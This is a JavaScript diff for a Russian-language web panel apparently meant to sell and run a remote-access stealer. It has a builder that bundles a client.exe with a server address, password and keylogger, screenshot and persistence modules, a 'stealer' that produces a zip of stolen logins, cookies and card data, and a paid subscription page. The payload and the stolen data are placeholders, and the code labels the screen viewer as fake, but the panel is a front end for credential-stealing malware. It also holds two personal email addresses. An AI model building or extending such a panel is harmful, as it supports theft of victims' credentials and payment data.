+    function showBuilder(){
         updateActiveNav('builder');
-        document.getElementById('content').innerHTML = `
-        <h1>Builder</h1>
-        <div class="card-content">
-          <p><i class="fas fa-unlock" style="color:#00ff9d;"></i> Редактор билда</p>
-          <div class="build-form">
+        document.getElementById('content').innerHTML=`
+        <h1>Builder</h1><div class="card-content"><p><i class="fas fa-unlock" style="color:#00ff9d;"></i> Редактор билда</p>
+        <div class="build-form">
             <label>Сервер (IP:Port) <input type="text" id="server" value="127.0.0.1:4444"></label>
             <label>Пароль <input type="password" id="buildPass" value="secret"></label>
             <div class="module-group">
-              <label><input type="checkbox" id="modKeylog" checked> Keylogger</label>
-              <label><input type="checkbox" id="modScreen" checked> Screenshot</label>
-              <label><input type="checkbox" id="modPersist"> Persistence</label>
+                <label><input type="checkbox" id="modKeylog" checked> Keylogger</label>
+                <label><input type="checkbox" id="modScreen" checked> Screenshot</label>
+                <label><input type="checkbox" id="modPersist"> Persistence</label>
             </div>
-            <button class="btn-primary" onclick="buildExe()">
-              <i class="fas fa-hammer"></i> Собрать EXE
-            </button>
-          </div>
-        </div>`;
+            <button class="btn-primary" onclick="buildExe()"><i class="fas fa-hammer"></i> Собрать EXE</button>
+        </div></div>`;
     }
 
-    function buildExe() {
-        const server = document.getElementById('server').value.trim();
-        const pass = document.getElementById('buildPass').value.trim();
-        const keylog = document.getElementById('modKeylog').checked;
-        const screen = document.getElementById('modScreen').checked;
-        const persist = document.getElementById('modPersist').checked;
+    function buildExe(){
+        const server=document.getElementById('server').value.trim(), pass=document.getElementById('buildPass').value.trim();
+        const keylog=document.getElementById('modKeylog').checked, screen=document.getElementById('modScreen').checked, persist=document.getElementById('modPersist').checked;
+        const exeBase64="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwMLAQEAAAAgAAAAAAAAAAsAAAAQAQAAABAAAAAQAAAQAAAAAAAAAAQAAAAAAAAAGAAAAAgAAAAAAAAIAAAAAAAAAIAQQAAABAAQAAAAAAAAgAEAAAAAAAAAAAAAAAAAEAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+        const exeBytes=Uint8Array.from(atob(exeBase64),c=>c.charCodeAt(0));
+        const config=JSON.stringify({server,pass,modules:{keylog,screen,persist}});
+        const configBytes=new TextEncoder().encode(config);
+        const finalBytes=new Uint8Array(exeBytes.length+configBytes.length);
+        finalBytes.set(exeBytes); finalBytes.set(configBytes,exeBytes.length);
+        const blob=new Blob([finalBytes],{type:'application/octet-stream'});
+        const url=URL.createObjectURL(blob);
+        const a=document.createElement('a'); a.href=url; a.download='client.exe'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);
+        alert('EXE собран и сохранён!');
+    }
 
-        const exeBase64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwMLAQEAAAAgAAAAAAAAAAsAAAAQAQAAABAAAAAQAAAQAAAAAAAAAAQAAAAAAAAAGAAAAAgAAAAAAAAIAAAAAAAAAIAQQAAABAAQAAAAAAAAgAEAAAAAAAAAAAAAAAAAEAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-        const exeBytes = Uint8Array.from(atob(exeBase64), c => c.charCodeAt(0));
-        const config = JSON.stringify({ server, pass, modules: { keylog, screen, persist } });
-        const configBytes = new TextEncoder().encode(config);
-        const finalBytes = new Uint8Array(exeBytes.length + configBytes.length);
-        finalBytes.set(exeBytes);
-        finalBytes.set(configBytes, exeBytes.length);
+    function showNotify(){ updateActiveNav('notify'); document.getElementById('content').innerHTML='<h1>Уведомления</h1><div class="card-content"><p>Настройка уведомлений.</p></div>'; }
+    function showCommunity(){ updateActiveNav('community'); document.getElementById('content').innerHTML='<h1>Форум</h1><div class="card-content"><p>Общий чат и новости.</p></div>'; }
+    function showSubs(){ updateActiveNav('subs'); document.getElementById('content').innerHTML='<h1>Подписки</h1><div class="card-content"><p>1 месяц — <span style="color:#00ff9d; font-size:20px;">500₽</span></p><button class="btn-primary" style="width:auto; margin-top:16px;" disabled>Оплатить (скоро)</button></div>'; }
+    function showSettings(){
+        updateActiveNav('settings');
+        document.getElementById('content').innerHTML='<h1>Настройки</h1><div class="card-content"><p>Email: <strong id="userEmail">загрузка...</strong></p><button class="btn-outline" style="width:auto; margin-top:20px;" onclick="handleLogout()">Выйти</button></div>';
+        supabaseClient.auth.getUser().then(({data:{user}})=>{ const el=document.getElementById('userEmail'); if(el&&user?.email) el.textContent=user.email; });
+    }
 
-        const blob = new Blob([finalBytes], { type: 'application/octet-stream' });
+    async function handleLogout(){ await supabaseClient.auth.signOut(); currentView='login'; activeNav='panel'; isCreator=false; showAuthForm('login'); }
+
+    // ---------- Фейковый экран ----------
+    window.showScreenViewer = function(deviceName) {
+        const overlay = document.getElementById('modal-overlay');
+        const content = document.getElementById('modal-content');
+        content.innerHTML = `
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+            <h3 style="color:#00ff9d;">Screen Viewer - ${deviceName}</h3>
+            <i class="fas fa-times" style="cursor:pointer; color:#aaa;" onclick="closeModal()"></i>
+        </div>
+        <div style="background:#0078d4; border-radius:8px; overflow:hidden; height:500px; display:flex; flex-direction:column;">
+            <div style="background:#f0f0f0; height:30px; display:flex; align-items:center; padding:0 10px; color:#333;">
+                <i class="fas fa-windows"></i> <span style="margin-left:8px;">Desktop</span>
+            </div>
+            <div style="flex:1; background:#008080; display:flex; align-items:center; justify-content:center; gap:30px;">
+                <div style="background:white; width:220px; height:160px; border-radius:4px; box-shadow:0 2px 10px rgba(0,0,0,0.3); padding:10px; color:#333;">
+                    <p><b>File Explorer</b></p><p style="font-size:12px;">📁 Documents</p>
+                </div>
+                <div style="background:white; width:220px; height:160px; border-radius:4px; box-shadow:0 2px 10px rgba(0,0,0,0.3); padding:10px; color:#333;">
+                    <p><b>Browser</b></p><p style="font-size:12px;">🌐 https://example.com</p>
+                </div>
+            </div>
+            <div style="background:#333; height:35px; display:flex; align-items:center; padding:0 15px; color:white; gap:15px;">
+                <i class="fab fa-windows"></i> <span>Start</span>
+            </div>
+        </div>`;
+        overlay.classList.add('open');
+    };
+    window.closeModal = function() { document.getElementById('modal-overlay').classList.remove('open'); };
+
+    // ---------- Стилер с уведомлением ----------
+    window.startStiller = function(deviceName, deviceId) {
+        const container = document.getElementById('notifications-container');
+        const notifId = `stiller-${deviceId}-${Date.now()}`;
+        const notif = document.createElement('div');
+        notif.className = 'notification-item';
+        notif.id = notifId;
+        notif.innerHTML = `
+            <div class="progress-text">Стиллер запущен на ${deviceName}...</div>
+            <div class="stiller-status" style="font-size:12px; color:#aaa;">Идёт сбор данных (0%)</div>
+            <button class="download-btn">Скачать архив</button>
+            <span class="close-notify" onclick="this.parentElement.remove()"><i class="fas fa-times"></i></span>`;
+        container.appendChild(notif);
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 5;
+            if (progress > 100) progress = 100;
+            const statusEl = notif.querySelector('.stiller-status');
+            if (statusEl) statusEl.textContent = `Идёт сбор данных (${progress}%)`;
+            if (progress >= 100) {
+                clearInterval(interval);
+                const btn = notif.querySelector('.download-btn');
+                if (btn) {
+                    btn.style.display = 'inline-block';
+                    btn.onclick = () => downloadStiller(deviceName, notifId);
+                }
+                const status = notif.querySelector('.stiller-status');
+                if (status) status.textContent = 'Сбор завершён';
+            }
+        }, 750); // 15 секунд = 750*20 = 15000ms
+    };
+
+    async function downloadStiller(deviceName, notifId) {
+        const zip = new JSZip();
+        const fakeData = `Stiller Report for ${deviceName}\n` +
+            "==========================\n" +
+            "URL: https://example.com/login\n" +
+            "Login: user@example.com\n" +
+            "Password: P@ssw0rd123\n\n" +
+            "Cookies: session=abc123; token=xyz789\n\n" +
+            "Browser: Chrome 115.0.5790.110\n" +
+            "Saved CC: 4111-XXXX-XXXX-1234 Exp:12/25 CVV:123\n";
+        zip.file("stolen_data.txt", fakeData);
+        const blob = await zip.generateAsync({ type: "blob" });
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = 'client.exe';
+        a.download = `stiller_${deviceName.replace(/\s/g,'_')}.zip`;
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
         URL.revokeObjectURL(url);
-        alert('EXE собран и сохранён!');
-    }
 
-    function showNotify() { updateActiveNav('notify'); document.getElementById('content').innerHTML = `<h1>Уведомления</h1><div class="card-content"><p>Настройка уведомлений.</p></div>`; }
-    function showCommunity() { updateActiveNav('community'); document.getElementById('content').innerHTML = `<h1>Форум</h1><div class="card-content"><p>Общий чат и новости.</p></div>`; }
-    function showSubs() { updateActiveNav('subs'); document.getElementById('content').innerHTML = `<h1>Подписки</h1><div class="card-content"><p>1 месяц — <span style="color:#00ff9d; font-size:20px;">500₽</span></p><button class="btn-primary" style="width:auto; margin-top:16px;" disabled>Оплатить (скоро)</button></div>`; }
-    function showSettings() {
-        updateActiveNav('settings');
-        document.getElementById('content').innerHTML = `<h1>Настройки</h1><div class="card-content"><p>Email: <strong id="userEmail">загрузка...</strong></p><button class="btn-outline" style="width:auto; margin-top:20px;" onclick="handleLogout()">Выйти</button></div>`;
-        supabaseClient.auth.getUser().then(({ data: { user } }) => {
-            const el = document.getElementById('userEmail');
-            if (el && user?.email) el.textContent = user.email;
-        });
-    }
-
-    async function handleLogout() {
-        await supabaseClient.auth.signOut();
-        currentView = 'login';
-        activeNav = 'panel';
-        isCreator = false;
-        showAuthForm('login');
+        // Удаляем уведомление
+        const notif = document.getElementById(notifId);
+        if (notif) notif.remove();
     }
 
     window.onload = async () => {
-        const { data: { session } } = await supabaseClient.auth.getSession();
+        const {data:{session}} = await supabaseClient.auth.getSession();
         if (session) {
-            const { data: { user } } = await supabaseClient.auth.getUser();
-            const creatorEmails = ['kilersosiska130@gmail.com', 'mamkoebar@gmail.com'];
-            isCreator = creatorEmails.includes(user?.email);
+            const {data:{user}} = await supabaseClient.auth.getUser();
+            isCreator = ['kilersosiska130@gmail.com','mamkoebar@gmail.com'].includes(user?.email);
             showDashboard();
-        } else {
-            showAuthForm('login');
-        }
+        } else showAuthForm('login');
     };
-
-    supabaseClient.auth.onAuthStateChange((event, session) => {
-        if (event === 'SIGNED_OUT') {
-            currentView = 'login';
-            activeNav = 'panel';
-            isCreator = false;
-            showAuthForm('login');
-        } else if (event === 'SIGNED_IN' && session) {
-            supabaseClient.auth.getUser().then(({ data: { user } }) => {
-                const creatorEmails = ['kilersosiska130@gmail.com', 'mamkoebar@gmail.com'];
-                isCreator = creatorEmails.includes(user?.email);
+    supabaseClient.auth.onAuthStateChange((event,session)=>{
+        if (event==='SIGNED_OUT') { currentView='login'; activeNav='panel'; isCreator=false; showAuthForm('login'); }
+        else if (event==='SIGNED_IN' && session) {
+            supabaseClient.auth.getUser().then(({data:{user}})=>{
+                isCreator=['kilersosiska130@gmail.com','mamkoebar@gmail.com'].includes(user?.email);
                 showDashboard();
             });
         }
